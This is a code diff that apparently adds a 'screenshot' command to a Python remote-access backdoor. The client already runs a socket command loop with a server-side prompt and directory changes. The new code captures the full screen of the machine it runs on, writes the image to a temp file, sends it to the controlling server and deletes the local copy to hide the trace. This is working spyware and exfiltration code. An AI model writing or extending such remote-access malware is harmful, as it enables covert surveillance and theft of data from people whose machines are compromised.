@@ -321,6 +321,35 @@ quit       - Close connection
                     s.send(info.encode() + os.getcwd().encode() + b"> ")
                     continue
                 
+                if cmd == "screenshot":
+                    info = "=== Screenshot Capture ===\n"
+                    try:
+                        from PIL import ImageGrab
+                        import tempfile
+                        
+                        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+                        filename = f"screenshot_{timestamp}.png"
+                        filepath = os.path.join(tempfile.gettempdir(), filename)
+                        
+                        screenshot = ImageGrab.grab()
+                        screenshot.save(filepath)
+                        
+                        info += f"Screenshot saved: {filepath}\n"
+                        info += "Transferring to server...\n"
+                        s.send(info.encode())
+                        
+                        send_file(s, filepath)
+                        os.remove(filepath)
+                        continue
+                    except ImportError:
+                        info += "ERROR: Pillow not installed. Run: pip install pillow\n"
+                        s.send(info.encode() + os.getcwd().encode() + b"> ")
+                        continue
+                    except Exception as e:
+                        info += f"Error: {str(e)}\n"
+                        s.send(info.encode() + os.getcwd().encode() + b"> ")
+                        continue
+                
                 if data[:2].decode("utf-8") == 'cd':
                     try:
                         os.chdir(data[3:].decode("utf-8"))
